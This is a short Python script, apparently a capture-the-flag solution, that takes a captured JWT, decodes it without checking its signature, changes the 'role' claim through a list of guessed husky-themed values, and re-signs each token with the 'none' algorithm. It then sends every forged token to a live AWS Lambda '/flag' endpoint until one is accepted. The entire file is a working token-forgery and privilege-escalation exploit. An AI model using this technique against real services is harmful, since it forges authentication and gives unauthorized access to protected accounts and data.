import jwt
import requests

# Original JWT
original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBhd3MiLCJyb2xlIjoiZG91YmxlX2h1c2t5IiwiZXhwIjoxNzM5NTkxOTY5LCJpYXQiOjE3Mzg5ODcxNjl9.60SWGnTO79TOHn2v-yjYoRDvfKxbP7Xdc7V0KWisSJk"

# Decode the JWT (without verification)
header, payload, signature = original_jwt.split('.')
decoded_payload = jwt.decode(original_jwt, options={"verify_signature": False})

# Target URL
url = "https://gg5z5bfszbqojno7wae76xr4ze0pyufg.lambda-url.us-east-1.on.aws/flag"

# Possible role values to test
role_variations = [
    "siberian_husky", "two_huskies", "twice_husky", "huskyhusky",
    "alpha_husky", "big_paws", "pack_leader", "wolf"
]

# Secret key (if known, otherwise set to None)
SECRET_KEY = None  # Replace with actual key if known

# Test each role variation
for role in role_variations:
    # Modify role
    decoded_payload["role"] = role

    # Generate new JWT
    if SECRET_KEY:
        new_jwt = jwt.encode(decoded_payload, SECRET_KEY, algorithm="HS256")
    else:
        new_jwt = jwt.encode(decoded_payload, None, algorithm="none")  # Try unsigned JWT

    # Send request with modified JWT
    headers = {"Authorization": f"Bearer {new_jwt}"}
    response = requests.get(url, headers=headers)

    # Print results
    print(f"Trying role: {role}")
    print(f"Response: {response.text}\n")

    # Check if we got the flag
    if "flag" in response.text.lower():
        print(f"🎉 SUCCESS! Flag found with role: {role}")
        break
